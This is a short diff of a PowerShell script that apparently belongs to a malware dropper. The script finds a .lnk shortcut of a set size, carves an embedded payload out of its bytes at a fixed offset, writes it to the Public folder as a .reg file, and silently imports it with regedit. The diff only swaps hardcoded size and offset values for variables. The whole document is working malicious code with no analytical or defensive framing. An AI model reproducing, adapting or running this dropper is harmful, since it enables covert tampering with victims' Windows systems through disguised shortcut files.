@@ -7,9 +7,9 @@ $2 = 5439
 Set-Location -Path $currentPath; 
 $dirPath = Get-Location;
 Set-Location -Path $dirPath.Path; 
-$lnkpaths = Get-ChildItem -Path $dirPath.Path -Recurse *.lnk | Where-Object { $_.length -eq 424796 } | Select-Object -ExpandProperty FullName;
+$lnkpaths = Get-ChildItem -Path $dirPath.Path -Recurse *.lnk | Where-Object { $_.length -eq $1 } | Select-Object -ExpandProperty FullName;
 $lnkpath = if ($lnkpaths -is [array]) {$lnkpaths[0]} else {$lnkpaths};
-$exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount 424796 -ReadCount 424796;
+$exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount $1 -ReadCount $1;
 $exePath = Join-Path $env:public '17399.reg';
-Set-Content $exePath ([byte[]]($exeFile | Select-Object -Skip 4837)) -Encoding Byte;
+Set-Content $exePath ([byte[]]($exeFile | Select-Object -Skip $2)) -Encoding Byte;
 Start-Process -FilePath 'regedit' -ArgumentList '/s', $exePath;
